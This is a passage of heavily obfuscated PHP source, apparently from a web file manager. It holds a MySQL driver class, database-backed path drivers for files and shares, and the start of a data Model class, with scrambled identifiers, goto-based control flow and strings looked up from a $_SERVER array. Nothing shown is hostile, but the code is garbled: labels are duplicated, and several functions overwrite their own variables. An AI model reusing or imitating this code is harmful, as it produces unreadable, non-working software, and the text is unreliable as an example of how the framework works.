3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto F; Cތ: } return $this->linkID[$b]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bԆ֍) { goto e; BĐ: think_status($Dڄ[20]); $this->queryID = $this->_linkID->query($bԆ֍); if ($this->_linkID->more_results()) { while (($aӕʕ = $this->_linkID->next_result()) != NULL) { $aӕʕ->free_result(); } } goto b됇ݙ; B˟״Ո: $this->queryStr = $bԆ֍; if ($this->queryID) { $this->free(); } think_action_status($Dڄ[19], 1); goto BĐ; e: $Dڄ =& $_SERVER[ԥ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B˟״Ո; b됇ݙ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aȏ; aȏ: } public function execute($Dɨ) { goto D; A٤ܱ: if (!1 === $F숄ސ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto FǴ; Cؽ: $this->queryStr = $Dɨ; if ($this->queryID) { $this->free(); } think_action_status($F[21], 1); goto Bۉ; Bۉ: think_status($F[20]); $F숄ސ = $this->_linkID->query($Dɨ); $this->debug(); goto A٤ܱ; D: $F =& $_SERVER[ԥ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cؽ; FǴ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cܵ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$cܵ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c) { $this->error(); return !1; } } return !0; } private function getAll() { $d▴ = array(); if ($this->numRows > 0) { for ($f = 0; $f < $this->numRows; $f++) { $d▴[$f] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $d▴; } public function getFields($Cڈ) { $b둏 =& $_SERVER[ԥ]; $dޒт = $this->query($b둏[795] . $this->parseKey($Cڈ)); $Ḍ = array(); if ($dޒт) { foreach ($dޒт as $eҷ => $AυƈǼ) { $Ḍ[$AυƈǼ[$b둏[27]]] = array($b둏[28] => $AυƈǼ[$b둏[27]], $b둏[29] => $AυƈǼ[$b둏[30]], $b둏[31] => (bool) ($AυƈǼ[$b둏[32]] === $b둏[33]), $b둏[34] => $AυƈǼ[$b둏[35]], $b둏[36] => strtolower($AυƈǼ[$b둏[37]]) == $b둏[38], $b둏[39] => strtolower($AυƈǼ[$b둏[40]]) == $b둏[41]); } } return $Ḍ; } public function getTables($Bު = '') { $a =& $_SERVER[ԥ]; $bλŵ = !empty($Bު) ? $a[797] . $Bު : $a[798]; $Dꉇ = $this->query($bλŵ); $eՎ = array(); if ($Dꉇ) { foreach ($Dꉇ as $D => $a) { $eՎ[$D] = current($a); } } return $eՎ; } public function replace($f, $C = array()) { $C̴ =& $_SERVER[ԥ]; foreach ($f as $E֟ => $dރ) { $d = $this->parseValue($dރ); if (is_scalar($d)) { $Eّ[] = $d; $d[] = $this->parseKey($E֟); } } $B񡍟 = $C̴[799] . $this->parseTable($C[$C̴[263]]) . $C̴[800] . implode($C̴[47], $d) . $C̴[801] . implode($C̴[47], $Eّ) . $C̴[802]; return $this->execute($B񡍟); } public function insertAll($a, $a = array(), $EÅ = false) { goto EӮ; EӮ: $Dͨڢ =& $_SERVER[ԥ]; if (!is_array($a[0])) { return !1; } $F֩ = array_keys($a[0]); goto B; d: $e = ($EÅ ? $Dͨڢ[804] : $Dͨڢ[805]) . $Dͨڢ[806] . $this->parseTable($a[$Dͨڢ[263]]) . $Dͨڢ[800] . implode($Dͨڢ[47], $F֩) . $Dͨڢ[807] . implode($Dͨڢ[47], $dԠί); return $this->execute($e); goto Fݡ; B: $dԠί = array(); foreach ($a as $Bǋ) { $a֔ = array(); foreach ($Bǋ as $cǖ => $F씤) { $F씤 = $this->parseValue($F씤); if (is_scalar($F씤)) { $a֔[] = $F씤; } } $dԠί[] = $Dͨڢ[244] . implode($Dͨڢ[47], $a֔) . $Dͨڢ[802]; } array_walk($F֩, array($this, $Dͨڢ[803])); goto d; Fݡ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Aʗ˺ =& $_SERVER[ԥ]; $this->error = $this->_linkID->errno . $Aʗ˺[4] . $this->_linkID->error; if ($Aʗ˺[33] != $this->queryStr) { $this->error .= LNG($Aʗ˺[45]) . $this->queryStr; } think_trace($this->error, $Aʗ˺[33], $Aʗ˺[46]); return $this->error; } public function escapeString($A˜) { if ($this->_linkID) { return $this->_linkID->real_escape_string($A˜); } else { return addslashes($A˜); } } public function parseKey(&$C܃, $eȪ = true) { $e֘ =& $_SERVER[ԥ]; if ($eȪ) { $C܃ = $this->parseKeyCheck($C܃); } if ($C܃ != $e֘[172] && !preg_match($e֘[808], $C܃)) { $C܃ = $e֘[809] . trim($C܃, $e֘[809]) . $e֘[809]; } return $C܃; } } goto F̠; bԨ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Aސ) { $this->pathParse = $Aސ; $this->model = Model($_SERVER[ԥ][1093]); } public function getPath($aԿ) { return trim($aԿ, $_SERVER[ԥ][8]); } public function pathFather($B) { $AΈ = $this->parse($B); $AΈ = $this->infoSimple($B); return $AΈ ? $AΈ[$_SERVER[ԥ][457]] : !1; } public function getPathName($Eߺ) { $c = $this->infoSimple($Eߺ); return $c ? $c[$_SERVER[ԥ][28]] : !1; } public function getPathOuter($b) { if (!$b) { return $b; } $a = $this->parse($b); return KodIO::make($a[$_SERVER[ԥ][363]]); } public function copyFolderFromIO($Bʥ, $b󩃧͞, $d, $Aׅ, $A­) { $Cć = $this->model->copyFolderFromIO($Bʥ, $b󩃧͞, $d, $Aׅ, $A­); return KodIO::make($Cć); } public function isParentOf($e, $Aɛ) { return $this->model->isParentOf($e, $Aɛ); } public function mkfile($d񘲸Ȓ, $b = '', $dϘ = REPEAT_RENAME) { $d =& $_SERVER[ԥ]; $eϛ = $this->parse($d񘲸Ȓ); $d񘲸Ȓ = $eϛ[$d[363]]; for ($fĉ = 0; $fĉ < count($eϛ[$d[1094]]); $fĉ++) { $bȂ때 = $eϛ[$d[1094]][$fĉ]; if ($fĉ == count($eϛ[$d[1094]]) - 1) { $d񘲸Ȓ = $this->model->mkfile($d񘲸Ȓ, $bȂ때, $b, $dϘ); break; } $d񘲸Ȓ = $this->model->mkdir($d񘲸Ȓ, $bȂ때, REPEAT_SKIP); } return $this->getPathOuter($d񘲸Ȓ); } public function mkdir($F, $dي = REPEAT_SKIP) { $B˃ډ =& $_SERVER[ԥ]; $D = $this->parse($F); $F = $D[$B˃ډ[363]]; for ($fͪ = 0; $fͪ < count($D[$B˃ډ[1094]]); $fͪ++) { $dܘБ = $D[$B˃ډ[1094]][$fͪ]; $F = $this->model->mkdir($F, $dܘБ, $dي); } return $this->getPathOuter($F); } public function copyFile($CȬ, $e¤, $cӤ҈ = REPEAT_REPLACE) { $f֔熞 =& $_SERVER[ԥ]; $eŚ = $this->parse($e¤); $c = $this->model->copy($CȬ, $eŚ[$f֔熞[363]], $cӤ҈, $eŚ[$f֔熞[75]]); return $c ? $this->getPathOuter($c) : !1; } public function moveFile($aČވ, $f, $B葓 = REPEAT_REPLACE) { $bꗨ =& $_SERVER[ԥ]; $A嗢 = $this->parse($f); $d˰ = $this->model->move($aČވ, $A嗢[$bꗨ[363]], $B葓, $A嗢[$bꗨ[75]]); return $d˰ ? $this->getPathOuter($d˰) : !1; } public function copy($CƇ, $bݸ, $A = REPEAT_REPLACE) { $F = $this->parse($bݸ); $AԳȺ = $this->model->copy($CƇ, $F[$_SERVER[ԥ][363]], $A); return $AԳȺ ? $this->getPathOuter($AԳȺ) : !1; } public function move($Eɯ, $fŸ, $cӡ = REPEAT_REPLACE) { $d = $this->parse($fŸ); $AӺ = $this->model->move($Eɯ, $d[$_SERVER[ԥ][363]], $cӡ); return $AӺ ? $this->getPathOuter($AӺ) : !1; } public function remove($Bߐ, $B֦ = true) { return $this->model->remove($Bߐ, $B֦); } public function rename($A׮, $Dؼ) { $b = $this->model->rename($A׮, $Dؼ); return $b ? $this->getPathOuter($A׮) : $b; } public function size($Bء) { $aї = $this->infoSimple($Bء); return $aї ? $aї[$_SERVER[ԥ][77]] : 0; } public function infoSimple($eƵ) { return $this->model->sourceInfo($eƵ); } public function info($B) { return $this->infoParse($B); } public function infoAuth($c) { return $this->infoParse($c, !1, !0); } public function infoWithChildren($d) { return $this->infoParse($d, !0); } protected function infoParse($E, $f΍Ѳ = false, $CԨ = false) { if (!$f΍Ѳ) { return $this->model->pathInfo($E, $CԨ); } return $this->model->pathInfoMore($E); } public function infoFull($Aנ) { $f̳ =& $_SERVER[ԥ]; $Bܮ眇 = explode($f̳[8], $Aנ); $B = implode($f̳[8], array_splice($Bܮ眇, 1)); return $this->model->pathInfoByPath($Bܮ眇[0], $B); } public function hashSimple($a򱂉) { $a鸔 =& $_SERVER[ԥ]; $BՑ = $this->infoWithChildren($a򱂉); return $BՑ[$a鸔[158]][$a鸔[160]]; } public function hashMd5($Dޭ) { $d݂˩ =& $_SERVER[ԥ]; $d蘯 = $this->infoWithChildren($Dޭ); return $d蘯[$d݂˩[158]][$d݂˩[159]]; } public function exist($Aߡɧ) { $D =& $_SERVER[ԥ]; $aŕ = $this->parse($Aߡɧ); if (!$aŕ[$D[75]]) { return $this->isFile($Aߡɧ) || $this->isFolder($Aߡɧ); } $C = array($D[364] => $aŕ[$D[363]], $D[28] => $aŕ[$D[75]]); $D = $this->model->where($C)->find(); return $D ? !0 : !1; } public function isFile($b띛) { $EÎϕ =& $_SERVER[ԥ]; $aΆ = $this->infoSimple($b띛); return $aΆ && $aΆ[$EÎϕ[366]] == $EÎϕ[83] ? !1 : !0; } public function isFolder($a) { $EűȠ =& $_SERVER[ԥ]; $cƴڂ = $this->infoSimple($a); return $cƴڂ && $cƴڂ[$EűȠ[366]] == $EűȠ[83] ? !0 : !1; } public function listPath($d, $C㇪ = false) { $d =& $_SERVER[ԥ]; if ($d == $d[33]) { return !1; } $D = array($d[364] => $d); if ($C㇪) { return $this->model->listSource($D, -1); } return $this->model->listSource($D); } public function has($cņ, $B = false, $Aտ = null) { $DԿރ =& $_SERVER[ԥ]; $F٤ = $this->infoWithChildren($cņ); if ($B) { return array($DԿރ[188] => $F٤[$DԿރ[188]], $DԿރ[187] => $F٤[$DԿރ[187]]); } return $Aտ ? $F٤[$DԿރ[188]] : $F٤[$DԿރ[187]]; } public function listAll($a) { $cچ = IO::info($this->pathParse[$_SERVER[ԥ][75]]); if (!$cچ) { return array(); } return $this->model->listAll($a); } public function getContent($dǱ) { return $this->model->getContent($dǱ); } public function setContent($cì, $EȔ穋 = '') { return $this->model->setContent($cì, $EȔ穋); } public function fileSubstr($fʸ, $C, $Aʛŉ) { return $this->model->fileSubstr($fʸ, $C, $Aʛŉ); } public function download($c, $eܟ = '') { $eƴ = get_path_father($eܟ); $d򞱒 = get_path_this($eܟ); $A䆋 = $this->model->fileInfoGet($c); $C롌 = IO::copy($A䆋[$_SERVER[ԥ][75]], $eƴ, !1, $d򞱒); return $C롌; } public function upload($e, $Fн, $Cܛ샜 = false, $C = REPEAT_REPLACE) { $dǓï =& $_SERVER[ԥ]; $cˑ = $this->parse($e); $d٣ = $this->model->addFile($cˑ[$dǓï[363]], $Fн, $cˑ[$dǓï[75]], $Cܛ샜, $C); return $this->getPathOuter($d٣); } public function uploadFileByID($C슲, $C҅ё, $AѴԅ) { $a =& $_SERVER[ԥ]; $Cʶ = $this->parse($C슲); $c益 = $this->model->addFileByFileID($Cʶ[$a[363]], $C҅ё, $Cʶ[$a[75]], $AѴԅ); return $this->getPathOuter($c益); } public function addFileByRemote($a᧒, $D, $CŐ = array(), $dݎէ = '', $c) { $C޷ =& $_SERVER[ԥ]; $Cԭ = $this->parse($a᧒); $dݎէ = empty($dݎէ) ? $Cԭ[$C޷[75]] : $dݎէ; $dߵ = $this->model->addFileByRemote($Cԭ[$C޷[363]], $D, $dݎէ, $CŐ, $c); return $this->getPathOuter($dߵ); } public function uploadLink($Eś, $c = 0) { $c𓝞 =& $_SERVER[ԥ]; $E = $this->parse($Eś); $Eś = Model($c𓝞[540])->createFileName($E[$c𓝞[75]]); $e뇏 = IO::uploadLink($Eś, $c); return $e뇏; } public function fileNameAuto($BӚ, $bߋ, $aŨ = REPEAT_REPLACE, $bă = false) { return $this->model->fileNameAuto($BӚ, $bߋ, $aŨ, $bă); } public function fileNameExist($fđ, $eʞɮ) { return $this->model->fileNameExist($fđ, $eʞɮ); } protected function _fileOut($cΩ, $bϜ = false, $Eߐ = false, $DϪ쒨 = '', $d = false) { goto aم; aم: $e =& $_SERVER[ԥ]; $e = $this->model->sourceInfo($cΩ); if ($e[$e[366]] == $e[83]) { header($e[1095]); die; } goto fߎ; FĜ: if ($d) { return IO::fileOutServer($eڌ[$e[75]], $bϜ, $A, $DϪ쒨); } IO::fileOut($eڌ[$e[75]], $bϜ, $A, $DϪ쒨); goto a흜; fߎ: $eڌ = $this->model->fileInfoGet($cΩ); $DϪ쒨 = $eڌ[$e[159]] ? $eڌ[$e[159]] : $DϪ쒨; $A = isset($GLOBALS[$e[1096]]) ? $GLOBALS[$e[1096]] : $e[$e[28]]; goto FĜ; a흜: } public function fileOut($f˟, $c = false, $cґ펆 = false, $b = '') { $this->_fileOut($f˟, $c, $cґ펆, $b); } public function fileOutServer($Cԃ, $cſǟߪ = false, $eʗ = false, $Fٜ = '') { $this->_fileOut($Cԃ, $cſǟߪ, $eʗ, $Fٜ, !0); } protected function _fileOutImage($B˻, $AԄ¼ǻ = 250) { $Bƥ =& $_SERVER[ԥ]; $Dֈ = $this->model->sourceInfo($B˻); if ($Dֈ[$Bƥ[366]] == $Bƥ[83]) { show_json($Bƥ[1097] . $B˻, !1); } $GLOBALS[$Bƥ[1096]] = $Dֈ[$Bƥ[28]]; $A = $this->model->fileInfoGet($B˻); IO::fileOutImage($A[$Bƥ[75]], $AԄ¼ǻ); } public function fileOutImage($Bɼ, $CӋ = 250) { $this->_fileOutImage($Bɼ, $CӋ); } public function fileOutImageServer($eԐ, $a = 250) { $this->_fileOutImage($eԐ, $a); } public function link($b삊ۃ, $d̻ = '') { $dэ = $this->model->fileInfoGet($b삊ۃ); return IO::link($dэ[$_SERVER[ԥ][75]], $d̻); } protected function parse($F󲛊) { $cͦ =& $_SERVER[ԥ]; if (strstr($F󲛊, $cͦ[8]) === !1) { return array($cͦ[381] => intval($F󲛊), $cͦ[75] => $cͦ[33], $cͦ[1094] => array()); } $cԂÚ = explode($cͦ[8], trim($F󲛊, $cͦ[8])); if (count($cԂÚ) < 2) { show_tips($F󲛊 . $cͦ[1098]); } return array($cͦ[381] => intval($cԂÚ[0]), $cͦ[75] => $cԂÚ[1], $cͦ[1094] => array_slice($cԂÚ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Fߋ) { $this->pathParse = $Fߋ; $this->model = Model($_SERVER[ԥ][1093]); } public function getPathOuter($fł) { $Bِ =& $_SERVER[ԥ]; if (!$fł) { return $fł; } $fˮÓ = $this->parse($fł); return trim(KodIO::makeShare($this->pathParse[$Bِ[363]], $fˮÓ[$Bِ[363]]), $Bِ[8]); } protected function infoParse($e҂, $fނ = false, $b웈 = false) { $c =& $_SERVER[ԥ]; $FËݔ = $this->pathParse[$c[363]]; $cԎƤ = trim($this->pathParse[$c[994]], $c[8]); return Action($c[1099])->sharePathInfo($FËݔ, $cԎƤ); } public function infoFull($fˍ) { $c =& $_SERVER[ԥ]; $d = explode($c[8], trim($fˍ, $c[8])); if (count($d) > 1) { $AԈ = implode($c[8], array_splice($d, 1)); $Aө = $this->model->pathInfoByPath($d[0], $AԈ); if (!$Aө) { return !1; } $this->pathParse[$c[994]] = $Aө[$c[365]]; } return $this->infoParse($fˍ); } public function listAll($Cܭݻ) { goto B; B: $Dꮜ =& $_SERVER[ԥ]; $Fۋ = IO::info($this->pathParse[$Dꮜ[75]]); if (!$Fۋ) { return array(); } goto C̬; a: foreach ($e as &$eȲ) { check_abort(); $eȲ[$Dꮜ[387]] = $EՋӠ->_shareItemeParse($eȲ[$Dꮜ[387]], $bţ); } return $e; goto f̐Ľ; C̬: $e = $this->model->listAll($Cܭݻ); $bţ = Model($Dꮜ[532])->getInfo($Fۋ[$Dꮜ[437]]); $EՋӠ = Action($Dꮜ[1099]); goto a; f̐Ľ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($B) { $this->pathParse = $B; $this->model = Model($_SERVER[ԥ][1093]); } protected function infoParse($f, $FԾ = false, $cɫ = false) { $a =& $_SERVER[ԥ]; return Action($a[1000])->sharePathInfo($this->pathParse[$a[75]], !0); } public function listPath($B֕, $CÈǦ = false) { $aޜ =& $_SERVER[ԥ]; $B¨ݓ = parent::listPath($B֕, $CÈǦ); foreach ($B¨ݓ as $d => $D) { if (!in_array($d, array($aޜ[73], $aޜ[74]))) { continue; } foreach ($D as $c͑ => $F㐥) { $B¨ݓ[$d][$c͑] = Action($aޜ[1000])->shareItemInfo($F㐥); } } return $B¨ݓ; } public function listAll($Eȕ) { $dԉ =& $_SERVER[ԥ]; $Bá = IO::info($this->pathParse[$dԉ[75]]); if (!$Bá) { return array(); } $ạ = $this->model->listAll($Eȕ); foreach ($ạ as &$Dشͯ) { $Dشͯ[$dԉ[387]] = Action($dԉ[1000])->shareItemInfo($Dشͯ[$dԉ[387]]); } return $ạ; } } goto Fň; a: define($_SERVER[ԥ][223], 2); define($_SERVER[ԥ][224], 3); define($_SERVER[ԥ][225], 1); goto a; a: define($_SERVER[ԥ][226], 0); define($_SERVER[ԥ][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\x65", "\x6f\162\x64\145\x72", "\141\x6c\151\x61\163", "\x68\141\x76\151\156\147", "\x67\x72\x6f\165\x70", "\x6c\157\x63\x6b", "\x64\151\x73\164\151\156\143\164", "\x61\165\x74\x6f", "\146\x69\154\x74\145\x72", "\x76\x61\x6c\151\144\x61\164\145", "\x72\x65\x73\x75\154\x74", "\142\x69\x6e\x64", "\164\x6f\153\x65\x6e"); public function __construct($b帚ܟ = '', $Bݗ = '', $Bڕ = '') { $e݋ =& $_SERVER[ԥ]; $this->_initialize(); if (!empty($b帚ܟ)) { if (strpos($b帚ܟ, $e݋[91])) { list($this->dbName, $this->name) = explode($e݋[91], $b帚ܟ); } else { $this->name = $b帚ܟ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Bݗ)) { $this->tablePrefix = $e݋[33]; } elseif ($e݋[33] != $Bݗ) { $this->tablePrefix = $Bݗ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($e݋[228]); } $this->db(0, empty($this->connection) ? $Bڕ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eő =& $_SERVER[ԥ]; if (empty($this->fields)) { if (think_config($eő[229])) { $B氖ߍ = $this->dbName ? $this->dbName : think_config($eő[230]); $F܊ő = think_var_cache($eő[231] . strtolower(get_path_this($B氖ߍ) . $eő[91] . $this->name)); if ($F܊ő) { $C̮ = think_config($eő[232]); if (empty($C̮) || $F܊ő[$eő[233]] == $C̮) { $this->fields = $F܊ő; return; } } } $this->flush(); } } public function flush() { goto c; b짌: if (!$E) { return !1; } $this->fields = array_keys($E); $this->fields[$A[234]] = !1; goto BĶ; a: if (think_config($A[229])) { $aŭ = $this->dbName ? $this->dbName : think_config($A[230]); think_var_cache($A[231] . strtolower(get_path_this($aŭ) . $A[91] . $this->name), $this->fields); } goto D; BĶ: foreach ($E as $dӃ => $e ) { $eӰ[$dӃ] = $e [$A[29]]; if ($e [$A[36]]) { $this->fields[$A[235]] = $dӃ; if ($e [$A[39]]) { $this->fields[$A[234]] = !0; } } } $this->fields[$A[236]] = $eӰ; if (think_config($A[232])) { $this->fields[$A[233]] = think_config($A[232]); } goto a; c: $A =& $_SERVER[ԥ]; $this->db->setModel($this->name); $E = $this->db->getFields($this->getTableName()); goto b짌; D: } public function switchModel($bߊߗ, $A = array()) { $aˎ =& $_SERVER[ԥ]; $f = ucwords(strtolower($bߊߗ)) . $aˎ[237]; if (!class_exists($f)) { think_exception($f . think_lang($aˎ[238])); } $this->_extModel = new $f($this->name); if (!empty($A)) { foreach ($A as $F) { $this->_extModel->setProperty($F, $this->{$F}); } } return $this->_extModel; } public function __set($C, $e) { $this->data[$C] = $e; } public function __get($eث㓕) { return isset($this->data[$eث㓕]) ? $this->data[$eث㓕] : null; } public function __isset($Dɟ) { return isset($this->data[$Dɟ]); } public function __unset($Dø) { unset($this->data[$Dø]); } public function __call($Bث, $b٪) { $B𰊖 =& $_SERVER[ԥ]; if (in_array(strtolower($Bث), $this->methods, !0)) { $this->options[strtolower($Bث)] = $b٪[0]; return $this; } elseif (in_array(strtolower($Bث), array($B𰊖[239], $B𰊖[240], $B𰊖[241], $B𰊖[242], $B𰊖[243]), !0)) { $EΡ̭ = isset($b٪[0]) ? $b٪[0] : $B𰊖[172]; $EΡ̭ = $this->db->parseKey($EΡ̭); return $this->getField(strtoupper($Bث) . $B𰊖[244] . $EΡ̭ . $B𰊖[245] . $Bث, $B𰊖[239]); } elseif (strtolower(substr($Bث, 0, 5)) == $B𰊖[246]) { $EΡ̭ = think_parse_name(substr($Bث, 5)); $Bʭŝ[$EΡ̭] = $b٪[0]; return $this->where($Bʭŝ)->find(); } elseif (strtolower(substr($Bث, 0, 10)) == $B𰊖[247]) { $e˨ = think_parse_name(substr($Bث, 10)); $Bʭŝ[$e˨] = $b٪[0]; return $this->where($Bʭŝ)->getField($b٪[1]); } elseif (isset($this->_scope[$Bث])) { return $this->scope($Bث, $b٪[0]); } elseif (method_exists($this, $Bث)) { array_unshift($b٪, $Bث); return call_user_func_array(array($this, $B𰊖[248]), $b٪); } else { return call_user_func_array(array(parent, $Bث), $b٪); } } protected function call() { goto c߬; c߬: $C𮔚 =& $_SERVER[ԥ]; $E╓ = func_get_args(); $Fф = array_shift($E╓); goto e܉; e܉: $D؎Γ = $Fф; if (is_array($Fф)) { $D؎Γ = $Fф[1]; $Fф = $Fф[0]; } $Fΐ߆ = count($E╓) - 1; goto Dׂ; D˽: $Bخ = call_user_func_array(array($this, $Fф), $E╓); if (method_exists($this, $C𮔚[252])) { $c = call_user_func_array(array($this, $C𮔚[253]), array($D؎Γ, $E╓, $Bخ)); if ($c) { return $c; } } return $Bخ; goto C; Dׂ: if (isset($E╓[$Fΐ߆]) && $E╓[$Fΐ߆] === $Fф) { think_exception(__CLASS__ . $C𮔚[4] . $Fф . think_lang($C𮔚[249])); return; } $E╓[] = $Fф; if (method_exists($this, $C𮔚[250])) { $c = call_user_func_array(array($this, $C𮔚[251]), array($D؎Γ, $E╓)); if (!is_null($c) && $c !== !1) { return $c; } } goto D˽; C: } protected function _initialize() { } protected function _facade($Bھ) { $aУũ =& $_SERVER[ԥ]; if (!empty($this->fields)) { foreach ($Bھ as $d => $Cͪ) { if (!in_array($d, $this->fields, !0)) { unset($Bھ[$d]); } elseif (is_scalar($Cͪ)) { $this->_parseType($Bھ, $d); } } } if (!empty($this->options[$aУũ[254]])) { $Bھ = array_map($this->options[$aУũ[254]], $Bھ); unset($this->options[$aУũ[254]]); } $this->_beforeWrite($Bھ); return $Bھ; } protected function _beforeWrite(&$AĎ) { } public function add($dħՃ = '', $c = array(), $E즡 = false) { goto C; dĦ: return $Cؕ; goto C; dס: if (!1 === $this->_beforeInsert($dħՃ, $c)) { return !1; } $Cؕ = $this->db->insert($dħՃ, $c, $E즡); if (!1 !== $Cؕ) { $Cݑ = $this->getLastInsID(); if ($Cݑ) { $dħՃ[$this->getPk()] = $Cݑ; $this->_after_insert($dħՃ, $c); return $Cݑ; } $this->_after_insert($dħՃ, $c); } goto dĦ; C: if (empty($dħՃ)) { if (!empty($this->data)) { $dħՃ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ԥ][255]); return !1; } } $c = $this->_parseOptions($c); $dħՃ = $this->_facade($dħՃ); goto dס; C: } protected function _beforeInsert(&$cȨ, $Bͭ) { } protected function _after_insert($bį, $d) { } public function addAll($c, $F뉡 = array(), $dΆ = false) { goto að̗; e嫌: foreach ($c as $B׈͉Γ => $e콈) { $c[$B׈͉Γ] = $this->_facade($e콈); } if (method_exists($this->db, $aި[256])) { $bˢ⤌ = $this->db->insertAll($c, $F뉡, $dΆ); } else { $this->startTrans(); foreach ($c as $B׈͉Γ => $e콈) { $bˢ⤌ = $this->db->insert($e콈, $F뉡, $dΆ); } $this->commit(); } if (!1 !== $bˢ⤌) { $e = $this->getLastInsID(); if ($e) { return $e; } } goto e; e: return $bˢ⤌; goto b󋫿; að̗: $aި =& $_SERVER[ԥ]; if (empty($c)) { $this->error = think_lang($aި[255]); return !1; } $F뉡 = $this->_parseOptions($F뉡); goto e嫌; b󋫿: } public function selectAdd($bӧ = '', $Cʷ = '', $f՟ĉ = array()) { $f鯾 =& $_SERVER[ԥ]; $f՟ĉ = $this->_parseOptions($f՟ĉ); if (!1 === ($aձ = $this->db->selectInsert($bӧ ? $bӧ : $f՟ĉ[$f鯾[257]], $Cʷ ? $Cʷ : $this->getTableName(), $f՟ĉ))) { $this->error = think_lang($f鯾[258]); return !1; } else { return $aձ; } } public function save($Bñ = '', $Fοڽ = array()) { goto a¦ٷ; D: if (is_array($Fοڽ[$eےޮ[259]]) && isset($Fοڽ[$eےޮ[259]][$E蔥])) { $Cج = $Fοڽ[$eےޮ[259]][$E蔥]; } if (!1 === $this->_beforeUpdate($Bñ, $Fοڽ)) { return !1; } $b񇹹 = $this->db->update($Bñ, $Fοڽ); goto e; e: if (!1 !== $b񇹹) { if (isset($Cج)) { $Bñ[$E蔥] = $Cج; } $this->_afterUpdate($Bñ, $Fοڽ); } return $b񇹹; goto e; Fӏ: $Fοڽ = $this->_parseOptions($Fοڽ); $E蔥 = $this->getPk(); if (!isset($Fοڽ[$eےޮ[259]])) { if (isset($Bñ[$E蔥])) { $b[$E蔥] = $Bñ[$E蔥]; $Fοڽ[$eےޮ[259]] = $b; unset($Bñ[$E蔥]); } else { $this->error = think_lang($eےޮ[258]); return !1; } } goto D; a¦ٷ: $eےޮ =& $_SERVER[ԥ]; if (empty($Bñ)) { if (!empty($this->data)) { $Bñ = $this->data; $this->data = array(); } else { $this->error = think_lang($eےޮ[255]); return !1; } } $Bñ = $this->_facade($Bñ); goto Fӏ; e: } protected function _beforeUpdate(&$d杖, $eΏ) { } protected function _afterUpdate($cҊ, $c) { } public function delete($Aė = array()) { goto a褜; f֋Ě: if (is_numeric($Aė) || is_string($Aė)) { if (strpos($Aė, $b݊[47])) { $aԃҫ[$Aǯ] = array($b݊[260], $Aė); } else { $aԃҫ[$Aǯ] = $Aė; } $this->options[$b݊[259]] = $aԃҫ; } $Aė = $this->_parseOptions(); if (is_array($Aė[$b݊[259]]) && isset($Aė[$b݊[259]][$Aǯ])) { $D∴ = $Aė[$b݊[259]][$Aǯ]; } goto c羂ᘃ; a褜: $b݊ =& $_SERVER[ԥ]; if (empty($Aė) && empty($this->options[$b݊[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Aǯ = $this->getPk(); goto f֋Ě; c羂ᘃ: $A˗ = $this->db->delete($Aė); if (!1 !== $A˗) { $d딖 = array(); if (isset($D∴)) { $d딖[$Aǯ] = $D∴; } $this->_after_delete($d딖, $Aė); } return $A˗; goto aǵ; aǵ: } protected function _after_delete($Fؾ񔜥, $b̫˯) { } public function select($f迌ި = array()) { goto Dı砞; Dı砞: $b =& $_SERVER[ԥ]; if (is_string($f迌ި) || is_numeric($f迌ި)) { $f = $this->getPk(); if (strpos($f迌ި, $b[47])) { $a[$f] = array($b[260], $f迌ި); } else { $a[$f] = $f迌ި; } $this->options[$b[259]] = $a; } elseif (!1 === $f迌ި) { $f迌ި = $this->_parseOptions(); return $b[261] . $this->db->buildSelectSql($f迌ި) . $b[262]; } $f迌ި = $this->_parseOptions(); goto F; aΐ: $this->_afterSelect($bĵ抵, $f迌ި); return $bĵ抵; goto B; F: $bĵ抵 = $this->db->select($f迌ި); if (!1 === $bĵ抵) { return !1; } if (empty($bĵ抵)) { return null; } goto aΐ; B: } protected function _afterSelect(&$C؉, $F) { } public function buildSql($C؛ϣ = array()) { $FͶи =& $_SERVER[ԥ]; $C؛ϣ = $this->_parseOptions($C؛ϣ); return $FͶи[261] . $this->db->buildSelectSql($C؛ϣ) . $FͶи[262]; } public function optionsValue($fՒ = null) { if (is_null($fՒ)) { return $this->options; } elseif (is_array($fՒ)) { $this->options = array_merge($this->options, $fՒ); } } protected function _parseOptions($F = array()) { goto BЈ; c疆: if (isset($F[$f؃׭[259]]) && is_array($F[$f؃׭[259]]) && !empty($F) && !isset($F[$f؃׭[266]]) && !isset($F[$f؃׭[263]])) { foreach ($F[$f؃׭[259]] as $E޹ => $D) { $E޹ = trim($E޹); if (in_array($E޹, $F, !0)) { if (is_scalar($D)) { $this->_parseType($F[$f؃׭[259]], 